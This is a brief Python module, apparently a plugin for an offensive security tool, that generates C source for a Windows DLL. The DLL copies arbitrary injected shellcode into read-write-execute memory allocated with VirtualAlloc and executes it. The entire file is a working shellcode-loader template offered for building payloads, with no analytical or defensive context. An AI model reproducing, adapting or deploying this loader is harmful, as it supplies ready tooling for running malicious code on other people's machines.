from ClassCongregation import BinaryDataTypeConversion
import random
__heading__="C-DLL-Windows-MemoryEnforcement"
__language__=".c"
__process__=".dll"

def main(Shellcode):
    Code = """
#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char buf[] = \""""+Shellcode+"""\";

int add()

{
    LPVOID Memory;

    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(Memory, buf, sizeof(buf));

    ((void(*)())Memory)();
    return 0;

}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
"""
    return Code

